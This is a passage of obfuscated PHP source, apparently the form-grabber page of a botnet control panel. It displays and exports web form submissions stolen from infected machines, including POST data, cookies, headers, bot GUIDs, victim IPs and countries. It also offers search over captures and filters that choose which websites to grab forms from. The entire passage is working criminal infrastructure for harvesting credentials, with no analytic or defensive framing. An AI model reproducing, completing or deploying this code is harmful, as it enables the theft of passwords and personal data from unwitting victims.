    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Forms captured (past 24 hours)", $stats_total_forms_24h);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Forms captured (past 3 days)", $stats_total_forms_3d);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Forms captured (past 7 days)", $stats_total_forms_7d);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("", "");
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Chrome", (string) $stats_total_chrome . " (" . $stats_total_chrome_percent . "%)");
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Firefox", (string) $stats_total_firefox . " (" . $stats_total_firefox_percent . "%)");
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Internet Explorer", (string) $stats_total_ie . " (" . $stats_total_ie_percent . "%)");
    _obfuscated_0D152C300D16140F2C371E291D062F020D071537162F01_();
    _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("Configure", 10, "top: -3px;", "");
    echo "\t\t\t\t\t\t\t\t<a href=\"";
    echo _obfuscated_0D39380D261501220C211A2B11123C2F0614010F360732_("");
    echo "\">View captured forms</a>\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t<a href=\"";
    echo _obfuscated_0D39380D261501220C211A2B11123C2F0614010F360732_("&form_filters=true");
    echo "\">Manage website grab filters (";
    echo $stats_total_filters;
    echo ")</a>\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t";
    _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("Actions", 10, "top: -3px;", "");
    echo "\t\t\t\t\t\t\t\t<a href=\"#\" onclick=\"document['clear_hidden_all_forms'].submit()\">Clear all captured forms</a>\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t<a href=\"#\" onclick=\"document['clear_hidden_all_forms_7d'].submit()\">Clear all captured forms older than a week</a>\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t<a href=\"#\" onclick=\"document['export_hidden_all_forms'].submit()\">Export captured forms</a>\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t";
    if (defined("IS_SPECIAL_VERSION")) {
        echo "<a href=\"#\" onclick=\"document['export_hidden_all_special_forms'].submit()\">Export captured SPECIAL forms</a>\r\n<br />\r\n";
    }
    echo "\t\t\t\t\t\t\t\t<a href=\"#\" onclick=\"document['export_hidden_redirect_clear'].submit()\">Clear existing export logs (";
    echo $pp_num_existing_export_logs;
    echo ")</a>\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t</tbody>\r\n\t\t\t\t</table>\r\n\t\t\t\t</font>\r\n\t\t\t</td>\r\n\t\t\t\r\n\t\t\t<td valign=\"top\">\r\n\r\n\t\t\t\t";
    echo "\t\t\t\t\t<font size=\"1\" face=\"Tahoma\">\r\n\t\t\t\t\t<!-- Forms status table -->\r\n\t\t\t\t\t<table class=\"table table-bordered table-condensed table-striped\" align=\"center\" valign=\"top\">\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\tForm grabber status:&nbsp;&nbsp;\r\n\t\t\t\t\t\t\t";
    if ($sqlSettings->Flags_General & GENERAL_FLAGS_FORMGRAB_DISABLED) {
        echo "<font color=\"#E80000\">Disabled</font>&nbsp;&nbsp;[ <a href=\"#\" onclick=\"document['set_formgrab_status_on'].submit()\">Enable</a> ]";
    } else {
        echo "<font color=\"#339900\">Enabled</font>&nbsp;&nbsp;[ <a href=\"#\" onclick=\"document['set_formgrab_status_off'].submit()\">Disable</a> ]";
    }
    if ($total_num_filters == 0) {
        echo "&nbsp;&nbsp;&nbsp;<i>(Inactive: No website filters exist. Formgrabber requires you to specify website filters to grab forms from.)</i>";
    }
    echo "\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t</table>\r\n\t\t\t\t\t</font>\r\n\t\t\t\t\t\r\n\t\t\t\t";
    if ($pp_export_action_is_true == true) {
        echo "\t\t\t\t\r\n\t\t\t\t\t<font size=\"1\" face=\"Tahoma\">\r\n\t\t\t\t\t<!-- Forms export alert table -->\r\n\t\t\t\t\t<table class=\"table table-bordered table-condensed table-striped\" align=\"center\" valign=\"top\" style=\"width: 1300px;\">\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t";
        $export_file_size = @filesize($pp_export_path);
        $export_file_size_string = "";
        if (1024 < $export_file_size) {
            $export_file_size /= 1024;
            $export_file_size_string = " " . $export_file_size . " kB";
        } else {
            if (0 < $export_file_size) {
                $export_file_size_string = " " . $export_file_size . " byte(s)";
            }
        }
        echo "\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\tDownload exported forms: &nbsp; <a href=\"";
        echo $pp_export_path;
        echo "\">Grabbed forms ( ";
        echo "/" . $pp_export_path . " &nbsp;-&nbsp; " . $export_file_size_string;
        echo "&nbsp; - &nbsp;";
        echo $total_num_exported;
        echo " entries )</a>\r\n\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t</table>\r\n\t\t\t\t\t</font>\r\n\t\t\t\t";
    }
    if (-1 < $pp_current_form_capture_view && $total_num_forms == 0) {
        echo "Invalid form entry<br />";
    } else {
        if (-1 < $pp_current_form_capture_view) {
            $pp_record = @mysql_fetch_assoc($all_forms);
            $geo_record = NULL;
            $clientEx = new CClient();
            $pp_bot_client_id = (int) $pp_record["bot_id"];
            $pp_bot_guid = @strtoupper(@bin2hex($pp_record["bot_guid"]));
            $pp_bot_os_string = isset($pp_record["bot_OS"]) ? $clientEx->GetFullOsStringFromMask($pp_record["bot_OS"], true) : "<strong>N/A</strong>";
            $pp_bot_local_time = isset($pp_record["bot_LocalTime"]) ? @date("m/d/Y h:i:s a", $pp_record["bot_LocalTime"]) : "<strong>N/A</strong";
            $pp_grab_time = @date("m/d/Y h:i:s a", $pp_record["capture_date"]);
            $pp_last_ip = @long2ip($pp_record["bot_LastIP"]);
            $pp_last_ip_location = "<strong>N/A</strong>";
            if ($geo_record = $sqlGeoIP->GetIpLocation($pp_last_ip)) {
                $pp_last_ip_location = "<img src=\"" . $sqlGeoIP->GetFlagPath($geo_record["COUNTRY_CODE2"]) . "\"></img>&nbsp;" . $geo_record["COUNTRY_NAME"];
            }
            if (strlen($pp_last_ip_location) == 0) {
                $pp_last_ip_location = "Unknown";
            }
            $pp_host_process = $pp_record["host_process_path"];
            $pp_capture_url = $pp_record["host"];
            $pp_form_data = $pp_record["post_data"];
            $pp_form_data_headers = str_replace("", "", $pp_record["post_headers"]);
            $pp_request_type = "";
            if (stripos($pp_form_data_headers, "POST *\r\n") === 0) {
                $pp_request_type = "POST";
                $pp_form_data_headers = str_replace("POST *\r\n", "", $pp_form_data_headers);
            } else {
                if (stripos($pp_form_data_headers, "GET *\r\n") === 0) {
                    $pp_request_type = "GET";
                    $pp_form_data_headers = str_replace("GET *\r\n", "", $pp_form_data_headers);
                    $pp_pos = stripos($pp_capture_url, "?");
                    if ($pp_pos != false) {
                        $pp_capture_url = substr($pp_capture_url, 0, $pp_pos - 1);
                    }
                } else {
                    if (stripos($pp_form_data_headers, "SPECIAL *\r\n") === 0) {
                        $pp_request_type = "SPECIAL";
                        $pp_form_data_headers = str_replace("SPECIAL *\r\n", "", $pp_form_data_headers);
                    } else {
                        $pp_request_type = "Unknown (Probably POST)";
                        $pp_form_data_headers = str_replace("UNKNOWN *\r\n", "", $pp_form_data_headers);
                    }
                }
            }
            echo "\t\t\t\t\t<font size=\"1\" face=\"Tahoma\">\r\n\t\t\t\t\t<!-- Individual form capture view -->\r\n\t\t\t\t\t<table class=\"table table-bordered table-condensed table-striped\" align=\"center\" valign=\"top\" style=\"width: 1300px;\">\r\n\t\t\t\t\t\t<tbody>\r\n\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t<td width=\"10%\">Bot GUID:</td>\r\n\t\t\t\t\t\t\t\t<td width=\"80%\">";
            echo $pp_bot_guid;
            echo "</td>\r\n\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t<td width=\"10%\">Bot OS:</td>\r\n\t\t\t\t\t\t\t\t<td width=\"80%\">";
            echo $pp_bot_os_string;
            echo "</td>\r\n\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t<td width=\"10%\">Bot local time:</td>\r\n\t\t\t\t\t\t\t\t<td width=\"80%\">";
            echo $pp_bot_local_time;
            echo "</td>\r\n\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t<td width=\"10%\">Capture time:</td>\r\n\t\t\t\t\t\t\t\t<td width=\"80%\">";
            echo $pp_grab_time;
            echo "</td>\r\n\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t<td width=\"10%\">Last IP:</td>\r\n\t\t\t\t\t\t\t\t<td width=\"80%\">";
            echo "<a href=\"" . _obfuscated_0D1B343104272A3128121F231B322210111B372F041911_(MOD_VIEW_BOT, "&id=" . $pp_bot_client_id) . "\">" . $pp_last_ip . "</a>";
            echo "</td>\r\n\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t<td width=\"10%\">Country:</td>\r\n\t\t\t\t\t\t\t\t<td width=\"80%\">";
            echo $pp_last_ip_location;
            echo "</td>\r\n\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t<td width=\"10%\">Request type:</td>\r\n\t\t\t\t\t\t\t\t<td width=\"80%\">";
            echo $pp_request_type;
            echo "</td>\r\n\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t<td width=\"10%\">Host process:</td>\r\n\t\t\t\t\t\t\t\t<td width=\"80%\">";
            echo @htmlspecialchars($pp_host_process);
            echo "</td>\r\n\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t<td width=\"10%\">Capture URL:</td>\r\n\t\t\t\t\t\t\t\t<td width=\"80%\">";
            echo @htmlspecialchars($pp_capture_url);
            echo "</td>\r\n\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t<td width=\"10%\"></td>\r\n\t\t\t\t\t\t\t\t";
            $form_data_format = @str_replace("&amp;", "<br /><strong>\r\n", @htmlspecialchars($pp_form_data));
            $form_data_format = @str_replace("=", "</strong>=", $form_data_format);
            if (stripos($form_data_format, "=")) {
                $form_data_format = "<strong>" . $form_data_format;
            }
            $pp_form_data_headers = str_replace("", "", $pp_form_data_headers);
            $pp_form_data_headers = str_replace("\n", "", @htmlspecialchars($pp_form_data_headers));
            if (16 < strlen($pp_form_data_headers)) {
                $pp_form_data_headers = str_replace("\n", "", $pp_form_data_headers);
                $pp_form_data_headers = str_replace("\r", "<br />", $pp_form_data_headers);
                $pp_form_data_headers = str_ireplace("User-Agent:", "<b>User-Agent:</b>", $pp_form_data_headers);
                $pp_form_data_headers = str_ireplace("Accept-Language:", "<b>Accept-Language:</b>", $pp_form_data_headers);
                $pp_form_data_headers = str_ireplace("Referer:", "<b>Referer:</b>", $pp_form_data_headers);
                $pp_form_data_headers = str_ireplace("Cookie:", "<b>Cookie:</b>", $pp_form_data_headers);
            }
            $form_headers_format = "<div style=\"font-size: 11px; face: font-family: Tahoma;\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t  <div class=\"accordion\" id=\"accordion2\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<a class=\"accordion-toggle\" data-toggle=\"collapse\" data-parent=\"#accordion2\" href=\"#collapseOne\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tClick here to view select POST headers from form capture\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</a>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t  </div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t  <div id=\"collapseOne\" class=\"accordion-body collapse\" style=\"height: 0px;\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<fieldset>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t  <div class=\"control-group\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"controls\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t  " . $pp_form_data_headers . "\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t  <br />\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</fieldset>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t  </div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>";
            if (16 < strlen($pp_form_data_headers)) {
                $form_data_format = $form_headers_format . $form_data_format;
            }
            echo "\t\t\t\t\t\t\t\t<td width=\"80%\" style=\"word-wrap: break-word;\"><br /><div style=\"width: 1035px;\">";
            echo $form_data_format;
            echo "</div></td>\r\n\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t</tbody>\r\n\t\t\t\t\t</table>\r\n\t\t\t\t\t</font>\r\n\t\t\t\t";
        } else {
            if (!isset($_GET["form_filters"])) {
                echo "\t\t\t\t\r\n\t\t\t\t\t<font size=\"1\" face=\"Tahoma\">\r\n\t\t\t\t\t<!-- Forms search table -->\r\n\t\t\t\t\t<table class=\"table table-bordered table-condensed table-striped\" align=\"center\" valign=\"top\" style=\"width: 1300px;\">\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t\t<form class=\"form-horizontal\" name=\"fs_form\" method=\"get\" action=\"";
                echo $_SERVER["REQUEST_URI"];
                echo "\">\r\n\t\t\t\t\t\t\t\t\t<input type=\"hidden\" name=\"mod\" value=\"forms\">\r\n\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t    ";
                $pp_search_date_start_string = "";
                $pp_search_date_end_string = "";
                if ($pp_search_date_start != 0) {
                    $pp_search_date_start_string = date("m/d/Y", $pp_search_date_start);
                }
                if ($pp_search_date_end != 0) {
                    $pp_search_date_end_string = date("m/d/Y", $pp_search_date_end);
                }
                echo "\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t<span style=\"";
                echo $font_style;
                echo " position: relative; top: 5px;\">Start search from (date)&nbsp;</span>\r\n\t\t\t\t\t\t\t\t\t<div class=\"input-append date\" id=\"dp3\" data-date-format=\"mm/dd/yyyy\" data-date=\"";
                echo $pp_search_date_start_string;
                echo "\">\r\n\t\t\t\t\t\t\t\t\t\t<input class=\"span2\" size=\"16\" type=\"text\" value=\"";
                echo $pp_search_date_start_string;
                echo "\" name=\"fs_date_start\" style=\"";
                echo $font_style;
                echo " position: relative; top: 3px; width: 90px; height: 10px;\" readonly>\r\n\t\t\t\t\t\t\t\t\t<span class=\"add-on\" style=\"height: 10px; position: relative; top: 3px;\"><i class=\"icon-th\" style=\"position: relative; top: -2px; \"></i></span>\r\n\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t<span style=\"";
                echo $font_style;
                echo " position: relative; top: 5px;\">\r\n\t\t\t\t\t\t\t\t\t&nbsp;&nbsp;to&nbsp;&nbsp;\r\n\t\t\t\t\t\t\t\t\t</span>\r\n\t\t\t\t\t\t\t\t\t<div class=\"input-append date\" id=\"dp4\" data-date-format=\"mm/dd/yyyy\" data-date=\"";
                echo $pp_search_date_end_string;
                echo "\">\r\n\t\t\t\t\t\t\t\t\t\t<input class=\"span2\" size=\"16\" type=\"text\" value=\"";
                echo $pp_search_date_end_string;
                echo "\" name=\"fs_date_end\" style=\"";
                echo $font_style;
                echo " position: relative; top: 3px; width: 90px; height: 10px;\" readonly>\r\n\t\t\t\t\t\t\t\t\t<span class=\"add-on\" style=\"height: 10px; position: relative; top: 3px;\"><i class=\"icon-th\" style=\"position: relative; top: -2px; \"></i></span>\r\n\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t\t<span style=\"position: relative; top: 7px;\">Search for specific website &nbsp;<i>(Partial text but no wildcards supported)</i></span><br />\r\n\t\t\t\t\t\t\t\t\t<input name=\"fs_host\" value=\"";
                echo htmlspecialchars($pp_search_term_host);
                echo "\" type=\"text\" class=\"span3\" style=\"position: relative; top: 8px; font-size: 10px; face: font-family: Tahoma; height: 16px; width: 280px;\">\r\n\t\t\t\t\t\t\t\t\t<br /><br />\r\n\t\t\t\t\t\t\t\t\t<span style=\"position: relative; top: 7px;\">Search by bot GUIDs <i>(guid1, guid2, ...)</i></span><br />\r\n\t\t\t\t\t\t\t\t\t<input name=\"fs_bot_guids\" value=\"";
                echo htmlspecialchars($pp_search_term_guids);
                echo "\" type=\"text\" class=\"span3\" style=\"position: relative; top: 8px; font-size: 10px; face: font-family: Tahoma; height: 16px; width: 560px;\">\r\n\t\t\t\t\t\t\t\t\t<br /><br />\r\n\t\t\t\t\t\t\t\t\t<span style=\"position: relative; top: 7px;\">Search in form capture content <i>(Partial text but no wildcards supported)</i></span><br />\r\n\t\t\t\t\t\t\t\t\t<input name=\"fs_content\" value=\"";
                echo htmlspecialchars($pp_search_term_content);
                echo "\" type=\"text\" class=\"span3\" style=\"position: relative; top: 8px; font-size: 10px; face: font-family: Tahoma; height: 16px; width: 560px;\">\r\n\t\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t\t<input name=\"fs_submit\" value=\"Search\" type=\"submit\" class=\"btn\" style=\"position: relative; top: 9px; font-size: 10px; face: font-family: Tahoma; height: 26px; width: 60px;\">\r\n\t\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t</form>\r\n\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t";
                if (defined("IS_SPECIAL_VERSION")) {
                    $url_view_all = "<a href=\"" . _obfuscated_0D39380D261501220C211A2B11123C2F0614010F360732_("") . "\">View All</a>";
                    $url_view_post = "<a href=\"" . _obfuscated_0D39380D261501220C211A2B11123C2F0614010F360732_("&view=post") . "\">View POST captures only</a>";
                    $url_view_get = "<a href=\"" . _obfuscated_0D39380D261501220C211A2B11123C2F0614010F360732_("&view=get") . "\">View GET captures only</a>";
                    $url_view_special = "<a href=\"" . _obfuscated_0D39380D261501220C211A2B11123C2F0614010F360732_("&view=special") . "\">View SPECIAL captures only</a>";
                    if (isset($_GET["view"])) {
                        if ($_GET["view"] == "post") {
                            $url_view_post = "<strong>" . $url_view_post . "</strong>";
                        } else {
                            if ($_GET["view"] == "get") {
                                $url_view_get = "<strong>" . $url_view_get . "</strong>";
                            } else {
                                if ($_GET["view"] == "special") {
                                    $url_view_special = "<strong>" . $url_view_special . "</strong>";
                                }
                            }
                        }
                    } else {
                        $url_view_all = "<strong>" . $url_view_all . "</strong>";
                    }
                    echo "<br />" . $url_view_all . " &nbsp;|&nbsp; " . $url_view_post . " &nbsp;|&nbsp; " . $url_view_get . " &nbsp;|&nbsp; " . $url_view_special . "\r\n";
                }
                echo "\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t</table>\r\n\t\t\t\t\t</font>\r\n\t\t\t\t\r\n\t\t\t\t\t<font size=\"1\" face=\"Tahoma\">\r\n\t\t\t\t\t";
                _obfuscated_0D0A1B251B251F2C1036213E1B065B24010C1F3B042911_(false);
                _obfuscated_0D1C08281828312E2801110E012122212235041D173B01_($pp_current_forms_view_page, $max_per_page, $total_num_forms, "forms_page");
                $clear_shit_link = _obfuscated_0D39380D261501220C211A2B11123C2F0614010F360732_("&clear_garbage=1");
                if ($pp_is_search_active == true || -1 < $pp_client_view_id) {
                    echo "&nbsp;&nbsp;&nbsp;<strong>Found " . $total_num_forms . " result(s)</strong>";
                }
                echo "<span style=\"float: right\"><a href=\"" . $clear_shit_link . "\">Delete ad-related/safe browsing-related captures</a></span>";
                _obfuscated_0D1D13360F190502082F110F39373B390B5B2F14252601_(false);
                echo "\t\t\t\t\t<!-- Forms list table -->\r\n\t\t\t\t\t<table class=\"table table-bordered table-condensed table-striped\" align=\"center\" valign=\"top\" style=\"width: 1300px;\">\r\n\t\t\t\t\t\t<thead>\r\n\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t<th width=\"165\">Host</th>\r\n\t\t\t\t\t\t\t\t<th width=\"345\">Form</th>\r\n\t\t\t\t\t\t\t\t<th width=\"75\">Browser</th>\r\n\t\t\t\t\t\t\t\t<th width=\"85\">Capture date</th>\r\n\t\t\t\t\t\t\t\t<th width=\"80\">Options</th>\r\n\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t</thead>\r\n\t\t\t\t\t\t<tbody>\r\n\t\t\t\t\t";
                if (0 < $total_num_forms) {
                    $start_at = ($pp_current_forms_view_page - 1) * $max_per_page;
                    for ($current_index = 0; $current_row = @mysql_fetch_assoc($all_forms); $current_index++) {
                        _obfuscated_0D183F1A03362F2D3504172129372E0A39061C3D0A0111_($current_row["id"], $current_row["host"], $current_row["post_data"], $current_row["capture_date"], $current_row["host_process_path"]);
                    }
                } else {
                    $no_forms_string = "No forms captured ...";
                    if ($pp_is_search_active == true || -1 < $pp_client_view_id) {
                        $no_forms_string = "No results ...";
                    }
                    echo "<tr><td>" . $no_forms_string . "</td><td></td><td></td><td></td><td></td></tr>";
                }
                echo "\t\t\t\t\t\t\t</tbody>\r\n\t\t\t\t\t</table>\r\n\t\t\t\t\t<center>\r\n\t\t\t\t\t";
                _obfuscated_0D0A1B251B251F2C1036213E1B065B24010C1F3B042911_(false);
                _obfuscated_0D1C08281828312E2801110E012122212235041D173B01_($pp_current_forms_view_page, $max_per_page, $total_num_forms, "forms_page");
                _obfuscated_0D1D13360F190502082F110F39373B390B5B2F14252601_(false);
                echo "\t\t\t\t\t<br /></center>\r\n\t\t\t\t\t</font>\r\n\t\t\t\t</td>\r\n\t\t\t</tr>\r\n\t\t\t</table>\r\n\t\t\t";
            } else {
                if (isset($_GET["form_filters"])) {
                    echo "\t\t\t\t\t<font size=\"1\" face=\"Tahoma\">\r\n\t\t\t\t\t<!-- Formgrab add filter table -->\r\n\t\t\t\t\t<table class=\"table table-bordered table-condensed table-striped\" align=\"center\" valign=\"top\" style=\"width: 1300px;\">\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t\t<form name=\"forms_search_form\" method=\"post\" action=\"";
                    echo _obfuscated_0D39380D261501220C211A2B11123C2F0614010F360732_("&form_filters=true");
                    echo "\">\r\n\r\n\t\t\t\t\t\t\t\t  <div class=\"control-group\">\r\n\t\t\t\t\t\t\t\t  <label style=\"font-size: 10px; face: font-family: Tahoma\">Enter website URL / content filter(s) <i>(Wildcards (*) supported, but not REGEX)</i></label>\r\n\t\t\t\t\t\t\t\t\t<label class=\"control-label\" for=\"textarea\"></label>\r\n\t\t\t\t\t\t\t\t\t<div class=\"controls\">\r\n\t\t\t\t\t\t\t\t\t  <textarea class=\"input-xlarge\" id=\"textarea\" rows=\"1\" name=\"forms_add_filter\" style=\"width: 800px; height: 150px;\">";
                    echo isset($_POST["forms_add_filter"]) ? $_POST["forms_add_filter"] : "";
                    echo "</textarea>\r\n\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t  </div>\r\n\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t\t<input name=\"forms_add_filter_submit\" value=\"Add as URL filter(s)\" type=\"submit\" class=\"btn\" style=\"position: relative; top: 3px; font-size: 10px; face: font-family: Tahoma; height: 26px; width: 120px;\">\r\n\t\t\t\t\t\t\t\t\t<input name=\"forms_add_filter_content_submit\" value=\"Add as content filter(s)\" type=\"submit\" class=\"btn\" style=\"position: relative; top: 3px; font-size: 10px; face: font-family: Tahoma; height: 26px; width: 140px;\">\r\n\t\t\t\t\t\t\t\t\t&nbsp;&nbsp;&nbsp;\r\n\t\t\t\t\t\t\t\t\t<span style=\"font-size: 10px; face: font-family: Tahoma; height: 120px; position: relative; top: 6px\">\r\n\t\t\t\t\t\t\t\t\t<a href=\"#\" onclick=\"return filterexample();\">Show example filter</a>&nbsp;&nbsp;<strong>|</strong>&nbsp;&nbsp;<a href=\"#\" onclick=\"return contentfilterexample();\">How to add filters based on form content</a>\r\n\t\t\t\t\t\t\t\t\t</span>\r\n\t\t\t\t\t\t\t\t</form>\r\n\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t";
                    $filters_action_url = _obfuscated_0D39380D261501220C211A2B11123C2F0614010F360732_("&form_filters=true&filter_action=");
                    echo "<a href=\"" . $filters_action_url . "delete_all" . "\">Delete all filters</a>";
                    echo "&nbsp;&nbsp;|&nbsp;&nbsp;";
                    echo "<a href=\"" . $filters_action_url . "suspend_all" . "\">Suspend all filters</a>";
                    echo "&nbsp;&nbsp;|&nbsp;&nbsp;";
                    echo "<a href=\"" . $filters_action_url . "resume_all" . "\">Resume all filters</a>";
                    if ($sqlSettings->General_Options & GENERAL_OPTION_FORM_PAGE_VIEW_MINIMUM_INFO) {
                        echo "<span style=\"float: right\"><i>Form count by filter currently disabled via panel settings</i></span>";
                    }
                    echo "\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t</table>\r\n\t\t\t\t\t</font>\r\n\t\t\t\t\t\r\n\t\t\t\t\t<font size=\"1\" face=\"Tahoma\">\r\n\t\t\t\t\t<!-- Filter list table -->\r\n\t\t\t\t\t<table class=\"table table-bordered table-condensed table-striped\" align=\"center\" valign=\"top\">\r\n\t\t\t\t\t\t<thead>\r\n\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t<th width=\"405\">Filter</th>\r\n\t\t\t\t\t\t\t\t<th width=\"35\">Filter Type</th>\r\n\t\t\t\t\t\t\t\t<th width=\"10\">Captures</th>\r\n\t\t\t\t\t\t\t\t<th width=\"25\">State</th>\r\n\t\t\t\t\t\t\t\t<th width=\"75\">Options</th>\r\n\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t</thead>\r\n\t\t\t\t\t\t<tbody>\r\n\t\t\t\t\t\t";
                    if (0 < $total_num_filters) {
                        while ($current_row = @mysql_fetch_assoc($all_filters)) {
                            _obfuscated_0D3B2C09183729400E3B1E5C34243D0E1D302E2E0C0722_($current_row["id"], $current_row["filter_mask"], $current_row["options"]);
                        }
                    } else {
                        echo "<tr><td>No filters have been created ...</td><td></td><td></td><td></td><td></td></tr>";
                    }
                    echo "\t\t\t\t\t\t</tbody>\r\n\t\t\t\t\t</table>\r\n\t\t\t\t\t</font>\r\n\t\t\t\t\t\r\n\t\t\t ";
                }
            }
        }
    }
    echo "\t\t\t <form name=\"export_hidden_all_forms\" method=\"post\" action=\"";
    echo _obfuscated_0D39380D261501220C211A2B11123C2F0614010F360732_("");
    echo "\" style=\"visibility:hidden\">\r\n\t\t\t\t<input type=\"hidden\" name=\"export_submit\" value=\"yes\">\r\n\t\t\t</form>\r\n\t\t\t <form name=\"export_hidden_all_special_forms\" method=\"post\" action=\"";
    echo _obfuscated_0D39380D261501220C211A2B11123C2F0614010F360732_("");
    echo "\" style=\"visibility:hidden\">\r\n\t\t\t\t<input type=\"hidden\" name=\"export_special_submit\" value=\"yes\">\r\n\t\t\t</form>\r\n\t\t\t <form name=\"export_hidden_redirect_clear\" method=\"post\" action=\"";
    echo _obfuscated_0D39380D261501220C211A2B11123C2F0614010F360732_("");
    echo "\" style=\"visibility:hidden\">\r\n\t\t\t\t<input type=\"hidden\" name=\"export_submit_clear\" value=\"yes\">\r\n\t\t\t</form>\r\n\t\t\t <form name=\"clear_hidden_all_forms\" method=\"post\" action=\"";
    echo _obfuscated_0D39380D261501220C211A2B11123C2F0614010F360732_("");
    echo "\" style=\"visibility:hidden\">\r\n\t\t\t\t<input type=\"hidden\" name=\"clear_hidden_all_forms_submit\" value=\"yes\">\r\n\t\t\t</form>\r\n\t\t\t <form name=\"clear_hidden_all_forms_7d\" method=\"post\" action=\"";
    echo _obfuscated_0D39380D261501220C211A2B11123C2F0614010F360732_("");
